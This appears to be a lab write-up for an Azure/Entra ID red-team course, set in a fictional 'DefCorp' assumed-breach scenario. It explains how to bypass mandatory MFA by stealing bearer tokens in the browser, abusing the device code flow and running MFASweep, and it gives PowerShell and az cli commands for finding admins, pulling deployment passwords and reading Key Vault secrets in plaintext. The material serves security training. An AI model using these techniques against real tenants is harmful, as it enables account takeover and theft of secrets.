Phase 2: Authenticated Enumeration

The Lab Scenario (DefCorp)

Understanding your starting position is vital. In this guide, you are not usually starting as a random hacker on the internet trying to guess passwords. You are in an Assumed Breach scenario.

The Setup:

  • The Target: DefCorp, a defense contractor with high security requirements.
  • The Environment: A Hybrid setup. This means they have an On-Premise Active Directory that syncs users to the Azure Cloud.
  • Your Role: "External Contractor." You have been given legitimate, low-privilege credentials (email and password) to perform maintenance work.

This section is the bridge between Phase 1 (Outside) and Phase 2 (Inside). Before we can perform authenticated enumeration, we must solve a critical problem. We have the credentials for test@defcorphq.onmicrosoft.com but logging directly into the administrative portal blocks us because of Mandatory MFA Enforcement.

Authentication Bypass and Token Extraction

In an assumed breach scenario, possessing a username and password is no longer enough. Since late 2024, Microsoft has enforced Mandatory Multi-Factor Authentication (MFA) for all users attempting to sign into Azure Management portals.

However, this security control has a specific weakness we can exploit.

The "Mandatory MFA" policy targets specific administrative Cloud Applications like the "Azure Portal" or "Intune Admin Center." It often ignores standard user productivity portals.

Extracting ARM Tokens (Infrastructure Access)

The Difference Between Graph and ARM

It is critical to understand that Azure uses distinct tokens for distinct services. The token we stole from myaccount.microsoft.com is usually scoped for Microsoft Graph. It lets us ask questions like "Who are the users?" or "What groups exist?"

However, if you try to use that token to list Virtual Machines or Access Keys, Azure will reject it. To manipulate the infrastructure (Infrastructure-as-a-Service), we need an Azure Resource Manager (ARM) token.

The Technique: The Cosmos DB Portal

Just like we used "My Account" to get a Graph token, we need a portal that interacts with Azure resources but might be less strictly monitored.

A reliable target for this is the Azure Cosmos DB Explorer.

  1. Ensure you have an active session
  2. Browse to https://cosmos.azure.com
  3. Press F12 to open Developer Tools and select the Network tab
  4. Search for traffic going to management.azure.com
  5. Copy the Authorization value (Bearer eyJ...)

Abusing Device Authorization Flow

The Device Code Flow is designed for devices that have internet access but no browser or keyboard, like a Smart TV.

  1. The Device (Attacker's Script) says: "Hello Microsoft, I want to log in user test."
  2. Microsoft says: "Okay. Here is a short code (e.g., B4X9J). Tell the user to go to microsoft.com/devicelogin."
  3. The User goes to that URL, types the code, and logs in.
  4. Microsoft tells the Device: "Here are your tokens."

Step 1: Request Device Code

$ClientID = 'd3590ed6-52b3-4682-8fe7-2435e2344ea16'
$Scope = ".default offline_access"
$body = @{
"client_id" = $ClientID
"scope" = $Scope
}
$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" -Body $body
$authResponse

Step 2: The Authentication (Browser)

You open your browser (Incognito), go to microsoft.com/devicelogin, and type the code. Crucially, because Azure sees the request coming from "Intune App," it skips the MFA challenge.

Step 3: The Capture (PowerShell)

$body=@{
"client_id" = $ClientID
"grant_type" = $GrantType
"code" = $authResponse.device_code
}
$Tokens = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
$GraphToken = $Tokens.access_token

To request access token for the ARM API:

$scope = 'https://management.azure.com/.default'
$refresh_token = $tokens.refresh_token
$GrantType = 'refresh_token'
$body=@{
"client_id" = $ClientID
"scope" = $Scope
"refresh_token" = $refresh_token
"grant_type" = $GrantType
}
$Token_output = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/v2.0/token" -Body $body
$token = $Token_output.access_token

We can now use these tokens with Az PowerShell, Mg module or direct API calls.

Import-Module .\AADInternals.psd1
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

Automated Optimization: MFASweep

The manual methods rely on us guessing which applications are insecure. We use MFASweep to brute-force this discovery process.

Execution

Invoke-MFASweep -Username test@defcorphq... -Password 'Password123'

Output Analysis

  • MFA Required: The login failed. We cannot use this App ID.
  • MFA Enabled: The login failed because the user needs to complete MFA.
  • Success: The login succeeded! We can use this App ID to bypass MFA.

Enumeration - Mg Module (Microsoft Graph PowerShell)

This module allows you to interact directly with the Microsoft Graph API, which is the "control plane" for Entra ID (Identity).

Connection & Session (Pass-the-Token)

Connect-MgGraph
Get-MgContext
  • ClientId: The unique ID of the application (tool) communicating with Azure.
  • TenantId: The unique ID of the organization's Azure/Entra ID directory you are connected to.
  • Scopes: The specific permissions (privileges) granted to your current session.
Get-MgOrganization | fl *

User Enumeration & Reconnaissance

Get-MgUser -All
Get-MgUser -UserId test@defcorphq.onmicrosoft.com | fl *

Search for admin accounts:

Get-MgUser -Search '"DisplayName:admin"' -ConsistencyLevel eventual

Identify Hybrid users (synced from on-prem):

Get-MgUser -All | ?{$_.OnPremisesSecurityIdentifier -ne $null}

Identify Cloud-only users:

Get-MgUser -All | ?{$_.OnPremisesSecurityIdentifier -eq $null}

Determining User Impact & Influence

Get-MgUserCreatedObject -UserId test@defcorphq.onmicrosoft.com | fl *
Get-MgUserOwnedObject -UserId test@defcorphq.onmicrosoft.com | fl *
Get-MgUserMemberOf -UserId test@defcorphq.onmicrosoft.com

Groups and Dynamic Memberships

Get-MgGroup -All
Get-MgGroup -Filter "DisplayName eq 'VM Admins'" | fl *

Dynamic Groups (tactical entry point):

Get-MgGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}
Get-MgGroupMember -GroupId [GroupId]

Administrative Roles & Units

Get-MgDirectoryRole | fl *
Get-MgDirectoryRoleTemplate | fl *

Custom Roles:

Get-MgRoleManagementDirectoryRoleDefinition | ?{$_.IsBuiltIn -eq $False}

Administrative Units:

Get-MgDirectoryAdministrativeUnit | fl *

Find Global Administrators:

$RoleId = (Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'").Id
(Get-MgDirectoryRoleMember -DirectoryRoleId $RoleId).AdditionalProperties

Applications & Service Principals

Get-MgApplication -All

Apps with Password credentials (vulnerable targets):

Get-MgApplication -All | ?{$_.PasswordCredentials -ne $null}
Get-MgServicePrincipal -All
Get-MgServicePrincipal -Filter "DisplayName eq 'Finance Management System'"
Get-MgServicePrincipalOwnedObject -ServicePrincipalId [ObjectId]

Device Enumeration

Get-MgDevice -All

Active devices only:

Get-MgDevice -All | ?{$_.ApproximateLastSignInDateTime -ne $null}

2. Enumeration - Az PowerShell (Azure Resource Manager)

This is the standard administrative tool for managing infrastructure. While Mg Module focused on Identity, this module focuses on Resources (VMs, Storage, Key Vaults).

Connection (Identity & Resource Hybrid)

Connect-AzAccount

Infrastructure Mapping

This is your primary reconnaissance command. It returns an inventory of everything you have access to. You look through this output for interesting names like "Confidential," "Backup," "Prod," or "Sensitive."

The "Crown Jewels" (High-Value Targets)

  • ResearchKeyVault: We found a Key Vault. This is the highest priority target because it likely contains encryption keys, secrets, or passwords.
  • defcorpcommon: We found a Finance Storage Account. The name "common" suggests it is a shared file repository.

The Attack Vectors (Entry Points)

  • processfile & vaultfrontend: We identified two Web Applications. These are our "front doors."
  • bkpadconnect: We found a Virtual Machine in the Engineering group. This is a potential foothold for lateral movement.
Get-AzResourceGroup

Credential Mining (Deployment History)

This is a critical enumeration step. When administrators deploy resources, they often use automated JSON templates. If the deployment fails or even if it succeeds, the parameters (often including Admin Passwords) are saved in the logs.

Get-AzResourceGroupDeployment -ResourceGroupName [Name]

Once you identify an interesting deployment from the history, you download the actual template file:

Save-AzResourceGroupDeploymentTemplate -ResourceGroupName [Group] -DeploymentName [DeployName]

Privilege Discovery (Resource RBAC)

This command answers the question: "What am I allowed to do to in this infrastructure?" It lists your specific RBAC assignments.

Get-AzRoleAssignment -SignInName test@defcorphq.onmicrosoft.com

When you encounter a Custom Role with an unfamiliar name, inspect its definition:

Get-AzRoleDefinition -Name "Virtual Machine Command Executor"

Compute & Execution Paths

This lists the Virtual Machines in the subscription:

Get-AzVM | fl *

List App Services (filtering out Function Apps):

Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}

VM Extensions - Finding CustomScriptExtension is gold as the script files often contain hardcoded credentials:

Get-AzVMExtension -ResourceGroupName [Group] -VMName [Name]

Public IP addresses:

Get-AzPublicIpAddress

Network Interfaces - confirm internal IP addressing for pivoting:

Get-AzNetworkInterface

Function Apps - Serverless Functions utilize Managed Identities:

Get-AzFunctionApp

Storage & Sensitive Data

Key Vaults are the "crown jewels" - storing passwords, API keys, and certificates:

Get-AzKeyVault

List secrets in a vault:

Get-AzKeyVaultSecret -VaultName [Name]

Read secret plaintext:

Get-AzKeyVaultSecret -VaultName [Name] -Name [SecretName] -AsPlainText

Storage accounts - massive buckets of data:

Get-AzStorageAccount | fl

Enumeration - Azure CLI (az cli)

Priority: Rapid Assessment
Role: Cross-platform Querying & JSON Filtering
Context: Developers use this tool extensively. Its "JMESPath" query language allows you to filter huge datasets much faster than PowerShell loops.

Authentication

az login

Confirm current identity:

az ad signed-in-user show

Identity Querying

List all users in table format:

az ad user list -o table

List ONLY users synced from on-premise AD:

az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"

Users with job titles:

az ad user list --query "[].[displayName,jobTitle]" -o table

Group membership:

az ad group member list -g "VM Admins"

Resource & App Enumeration

List Virtual Machines:

az vm list
az vm list --query "[].[name]" -o table

Service Principals - find custom applications:

az ad sp list --all --query "[?contains(displayName,'app')].displayName"

Apps with Password credentials (priority targets):

az ad app list --query "[?passwordCredentials != null].displayName"
